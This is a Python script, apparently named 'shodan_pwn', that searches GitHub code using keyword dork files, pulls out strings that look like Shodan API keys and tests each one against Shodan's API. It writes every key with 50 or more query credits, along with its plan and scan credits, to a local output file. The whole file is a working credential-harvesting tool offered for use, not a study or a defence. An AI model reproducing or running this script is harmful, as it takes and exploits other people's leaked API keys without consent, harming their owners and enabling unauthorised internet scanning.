import os
import sys
import time
import datetime

from shodan import Shodan
from github import Github

if os.name == "nt": OS = "Windows"
else: OS = "Unix"

try:
    from shodan import Shodan
except ImportError:
    print ('\033[91m[-] you need to install the shodan module\033[0m')
    os.system("pip3 install shodan")

try:
    from github import Github
except ImportError:
    print ('\033[91m[-] you need to install the github module\033[0m')
    os.system("pip3 install github")


def print_banner():

    box = '''\033[91m
                          ┌─┐┬ ┬┌─┐┌┬┐┌─┐┌┐┌   ┌─┐┬ ┬┌┐┌
                          └─┐├─┤│ │ ││├─┤│││   ├─┘││││││
                          └─┘┴ ┴└─┘─┴┘┴ ┴┘└┘───┴  └┴┘┘└┘    
               ┌――――――――――――――――――――――――――――――――――――――――――――――――――┐ 
       ┌―――――――┤                \033[95mCredits: \033[94mgithub/9xN\033[91m               ├―――――――┐
       │       └――――――――――――――――――――――――――――――――――――――――――――――――――┘       │
       │ \033[93m$ \033[38;5;147mpython3 shodan_pwn.py <github-api-token> <keys.out> \033[92mor\033[38;5;147m prompts\033[91m │
       └――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――┘
\033[0m
'''
    print(box)

def clean(shodan_path):
    lines = []
    keyList = []

    with open(shodan_path, 'r+') as f:
        for line in f.readlines():
            if line.split(" ")[0] not in keyList:
                lines.append(line)
                keyList.append(line.split(" ")[0])

    with open(shodan_path, 'w') as f:
        for line in lines:
            f.write(line)


def check(key, shodan_path):
    try:
        shodan_api = Shodan(key)
        if shodan_api.info()['query_credits'] >= 50:
            print("Key Found!")
            with open(shodan_path, 'a+') as f:
                f.write(key + " Plan: " + str(shodan_api.info()['plan']) + " Credits: " + str(shodan_api.info()['query_credits']) + " Scans: " + str(shodan_api.info()['scan_credits']) + " HTTPS: " + str(shodan_api.info()['https']) + " Telnet: " + str(shodan_api.info()['telnet']) + "\n")
    except:
        pass
 
def search(token, shodan_path, keyword, language):
    while True:
        try:
            api = Github(token)
            api.per_page = 1
            repos = api.search_code(language + keyword)
            tc = repos.totalCount
        except Exception as e:
            if "rate limit" in str(e):
                time.sleep(30)
                continue
        break

    for i in range(0, tc):
        while True:
            try:
                lines = str(repos.get_page(i)[0].decoded_content, 'utf-8').split("\n")

                for line in lines:
                    original = line
                    line = line.strip().lower().replace(' ', '')

                    if keyword + '"' in line:
                        split = original.split('"')
                        if len(split[1]) == 32:
                            check(split[1], shodan_path)
                    elif keyword + "'" in line:
                        split = original.split("'")
                        if len(split[1]) == 32:
                            check(split[1], shodan_path)

            except Exception as e:
                if "rate limit" in str(e):
                    time.sleep(30)
                    continue
            break

def handler(gittoken, outkey):
    keywordFiles = os.listdir("dorks/") # ["dorks/javascript.txt"]
    language = None

    for keywordFile in keywordFiles:
        if "python" in keywordFile: language = "language:python "
        if "javascript" in keywordFile: language = "language:javascript "
        if "go" in keywordFile: language = "language:go "
        if "java" in keywordFile: language = "language:java "
        if "c" in keywordFile: language = "language:c "

        keywordList = []
        with open("dorks/" + keywordFile, 'r+') as f:
            for l in f.readlines():
                keywordList.append(l.removesuffix("\n"))

        try:
            for keyword in keywordList:
                dt = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                print("\033[38;5;41m[\033[38;5;45m" + dt + "\033[38;5;41m]" + " \033[38;5;219m- \033[38;5;93mSearching with query \033[38;5;219m~> \033[38;5;41m'\033[38;5;226m" + language + keyword + "\033[38;5;41m'\033[0m")
                search(gittoken, outkey, keyword, language)

            clean(outkey)

        except Exception as e:
            print("\n\033[91mError: " + str(e) + "\033[0m\n")
            exit()

try:
    if OS == "Windows": os.system("cls")
    else: os.system("clear")
    ascii_art = '''\033[32m\n                       Started!
                        _______________
    (my eye) -> (0) ==c(___(o(______(_()   (api keys on github)
                            \=\\
                             )=\\
                            //|\\\\
                           //|| \\\\  <- (telescope)
                          // ||  \\\\
                         //  ||   \\\\
                        //         \\\\
\033[0m'''
    if len(sys.argv) != 3:
        print_banner()
        gitkey = input("\033[38;5;128m[\033[38;5;40m+\033[38;5;128m]\033[38;5;111m Enter your github api key \033[38;5;219m~>\033[38;5;111m ")
        keyout = input("\033[38;5;128m[\033[38;5;40m+\033[38;5;128m]\033[38;5;111m Enter your output file that you would like to store found keys in \033[38;5;219m~>\033[38;5;111m ")
        print(ascii_art)
        handler(gitkey, keyout)
    else:
        gitkey = sys.argv[1]
        keyout = sys.argv[2]
        print(ascii_art)
        handler(gitkey, keyout)
except KeyboardInterrupt:
    exit()
